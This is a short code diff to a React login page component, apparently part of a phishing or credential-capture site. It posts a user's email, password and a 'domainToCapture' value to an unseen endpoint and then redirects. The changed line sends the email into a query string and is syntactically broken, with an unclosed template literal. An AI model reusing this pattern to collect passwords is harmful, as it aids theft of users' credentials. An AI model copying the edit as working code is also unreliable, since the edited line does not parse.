@@ -89,9 +89,7 @@ export default function LoginPage() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password, domain: domainToCapture }),
     })
-    setTimeout(() => {
-      window.location.href = 'https://testingmysite.com'
-    }, 2000)
+    setTimeout(() => { router.push(`/end?email=${encodeURIComponent(email)}, 2000)
   }
 
   return (
